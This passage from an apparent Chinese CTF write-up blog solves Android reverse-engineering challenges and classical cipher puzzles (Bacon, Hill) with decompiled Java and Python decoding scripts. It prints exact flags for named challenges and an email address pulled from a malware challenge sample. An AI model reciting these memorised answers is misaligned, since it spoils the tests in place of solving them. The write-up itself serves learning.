<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'\b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">MenuItem</span> item<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>action_settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测下面这段应该是获得flag 的关键<code>text.setText(String.valueOf(y));</code>这个的作用猜测是返回flag的值，只需要将上面的b字符串带入走一遍就行了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面给出解密用的python代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Z'</span> <span class="token operator">&lt;</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>            y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注册程序的破解-CTF向-1"><a href="#注册程序的破解-CTF向-1" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id="buu、简单注册器"><a href="#buu、简单注册器" class="headerlink" title="buu、简单注册器"></a>buu、简单注册器</h3><p><strong>题目描述</strong></p><p>生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag{} 提交</p><p><strong>解题过程</strong></p><p>看起来很一般的注册程序。。。直接拖入jadx试试，连个保护壳都没有，不过也正好，就是学不到新的知识了可能。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token string">"dd2940c04462b4dd7c450528835cca15"</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    textview<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span> <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不到10行的简单变换，直接出python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">'dd2940c04462b4dd7c450528835cca15'</span>x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>    x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Android病毒逆向"><a href="#Android病毒逆向" class="headerlink" title="Android病毒逆向"></a>Android病毒逆向</h2><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><blockquote><p>描述:你好，这是上次聚会相片，你看看（病毒，不建议安装到手机，提取完整邮箱即为flag） 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>题目挺简单的，就是软件没在模拟器上打得开，所以直接就逆向了一下so文件，直接找到最后的base64的三个串，都解一下密，发现</p><pre class="line-numbers language-none"><code class="language-none">MTgyMTg0NjUxMjVAMTYzLmNvbQ&#x3D;&#x3D;18218465125@163.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以flag就是上面的这个网易邮箱套上个flag即可。</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p><a href="http://rumkin.com/tools/cipher/baconian.php">培根密码在线解密</a></p><h4 id="GUET-CTF2019-NO-SOS"><a href="#GUET-CTF2019-NO-SOS" class="headerlink" title="[GUET-CTF2019]NO SOS"></a>[GUET-CTF2019]NO SOS</h4><p>原来题目上面都说了不是SOS也就是莫斯电码，而且如果是摩斯密码的话，没给出分隔符也是不好解的。所以这里是培根密码，本来只是AB这两个字符的故事，但是这两个字符可以使用其他的字符来表示，所以培根密码的形式是各式各样的都有，这里把<code>.</code>换成<code>A</code>、把<code>-</code>换成<code>B</code>即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span>–……<span class="token punctuation">.</span>–<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>…<span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>…–<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>…<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span>–<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span>—<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>太坑爹了，这个格式竟然还有错误，要修改为下面的内容</p><pre class="line-numbers language-none"><code class="language-none">..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>AABABABABBAAAAAAABBAABAAABAABAAABBABABAAAABAABAABBABABAABABAABBBB<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后粘贴出去在线培根解密即可。</p><p><img src="/2021/05/28/CTF/image-20210729205524795.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;guetkkp&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p><a href="https://www.cnblogs.com/mcprimer/articles/1418967.html">什么是希尔密码</a></p><h4 id="UTCTF2020-hill"><a href="#UTCTF2020-hill" class="headerlink" title="[UTCTF2020]hill"></a>[UTCTF2020]hill</h4><p>给出的内容为<code>wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;</code>，<code>wznqca</code>对应的内容就是<code>utflag</code>，而且这种加密是只针对字母来的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> strings <span class="token operator">=</span> <span class="token string">'wznqcaduqopfkqnwofDbzgeu'</span>flag_pre <span class="token operator">=</span> <span class="token string">'utflag'</span>dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token comment"># 猜测n为2，那么密钥就是2行2列的矩阵，与之相乘的矩阵也必定是2行的，故可以使用下面的方式爆破key</span><span class="token keyword">def</span> <span class="token function">getkey</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> b3<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a1 <span class="token operator">*</span> i <span class="token operator">+</span> b1 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c1 <span class="token keyword">and</span> <span class="token punctuation">(</span>a2 <span class="token operator">*</span> i <span class="token operator">+</span> b2 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c2 <span class="token keyword">and</span> <span class="token punctuation">(</span>a3 <span class="token operator">*</span> i <span class="token operator">+</span> b3 <span class="token operator">*</span> j<span class="token 